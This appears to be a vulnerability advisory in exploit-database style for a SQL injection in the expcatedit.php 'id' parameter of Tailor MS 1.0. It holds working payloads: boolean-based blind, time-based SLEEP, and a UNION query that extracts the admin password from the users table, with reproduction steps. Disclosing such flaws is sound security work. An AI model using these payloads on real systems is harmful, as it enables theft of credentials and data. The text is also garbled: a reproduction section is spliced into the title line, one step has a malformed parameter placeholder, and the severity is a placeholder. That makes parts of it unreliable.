# Exploit Title: Tailor MS – SQL Injection in expcatedit.php (`h## Steps to Reproduce

1. Browse to `http://localhost:8000/expcatedit.php?id=1`.  
2. Intercept the request and inject the following payload into the `id` parameter:
    ```
    http://localhost:8000/expcatedit.php?id=-1' union select password from users where username='admin'-- -
    ```
3. Observe the extracted admin password displayed in the application (see screenshot above).
4. Confirm DBMS fingerprinting and data extraction as permitted by the app's DB privileges.localhost:8000/expcatedit.php?id=1`)

**Date:** 2025-08-11  
**Exploit Author:** Anonymous  
**Vendor Homepage:** https://www.sourcecodester.com  
**Software Link:** //www.sourcecodester.com/sites/default/files/download/Warren%20Daloyan/tailor.zip  
**Version:** 1.0  
**Tested on:** PHP 7.4 on Ubuntu 20.04  

---

## Summary

A SQL Injection vulnerability exists in the `expcatedit.php` endpoint of **Tailor MS**. Unsanitized user input in the specified parameter is interpolated directly into an SQL query, allowing attackers to infer or extract data and, in some cases, execute stacked/time-based payloads.  
**Back-end DBMS (as detected):** MySQL >= 5.0.12 (MariaDB fork)  
**CWE:** CWE-89 (SQL Injection)  
**Severity:** High (placeholder — adjust once CVSS is computed)

## Affected Component & Parameter

### Affected Endpoint

- **URL:** `http://localhost:8000/expcatedit.php?id=1`
- **HTTP Method:** GET
- **Vulnerable File:** `expcatedit.php`
- **Parameter:** `id`
- **Vector Location:** GET

### Injection Techniques
- **Type:** boolean-based blind
  - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
  - **Payload:** `id=1' AND 6294=(SELECT (CASE WHEN (6294=6294) THEN 6294 ELSE (SELECT 2673 UNION SELECT 5862) END))-- -`
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `id=1' AND (SELECT 6621 FROM (SELECT(SLEEP(5)))TBGj)-- pjgM`
- **Type:** UNION query (exfiltration)
  - **Title:** UNION query to extract admin password - 1 column
  - **Payload:**  
    ```
    http://localhost:8000/expcatedit.php?id=-1' union select password from users where username='admin'-- -
    ```



## Proof of Concept (Firefox Screenshot)

![exploit](exploit.png)

## SQLMap Summary

![sqlmap-summary](sqlmap_summary.png)



## Technical Description

The vulnerable parameter is reflected into the SQL statement without proper validation or prepared statements. Boolean-based blind, time-based blind (SLEEP), and/or UNION-based vectors were verified by sqlmap. This enables database enumeration and potential data exfiltration under the privileges of the application’s DB user.

## Impact

- Enumeration of database schemas, tables, and rows  
- Exposure of sensitive user/operational data  
- Potential lateral movement if credentials or session material are stored in DB

## Steps to Reproduce

1. Browse to `http://localhost:8000/expcatedit.php?id=1`.  
2. Intercept the request and inject the provided payload(s) into parameter `expcatedit.php?&<param>=...`.  
3. Observe conditional responses / time delays / injected row reflections per technique above.  
4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.

## Vulnerable Code (Screenshot)

![vulnerable-code](code_snippet.png)


References  
OWASP: SQL Injection Prevention Cheat Sheet  
CWE-89: SQL Injection
